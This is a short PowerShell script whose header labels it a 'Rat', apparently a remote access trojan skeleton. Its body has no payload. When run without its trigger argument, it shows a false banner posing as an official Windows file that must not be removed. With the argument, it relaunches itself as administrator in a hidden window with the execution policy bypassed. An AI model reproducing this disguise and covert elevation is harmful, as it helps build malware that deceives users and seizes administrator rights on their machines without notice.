####################################################################################################
# Authors: github.com/NetConnectors
# Description: Rat
####################################################################################################

#Check if the script is running with params
if ($args.Count -eq 0 -or $args[0] -ne "/o" -and $args[0] -ne "/init") {
    Write-Host "###############################################"
    Write-Host "# This is an official Windows Script          #"
    Write-Host "# DO NOT REMOVE/MODIFY THIS FILE!             #"
    Write-Host "# DO NOT MODIFY THIS FILE!                    #"
    Write-Host "###############################################"
    Exit
}

$ProgressPreference = 'SilentlyContinue'

# Make sure the script is running as an administrator
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    Exit
}

# Check if the script is running in a Windows environment
if ($env:OS -ne "Windows_NT") {
    Exit
}




$ProgressPreference = 'Continue'

# Exit the script
Exit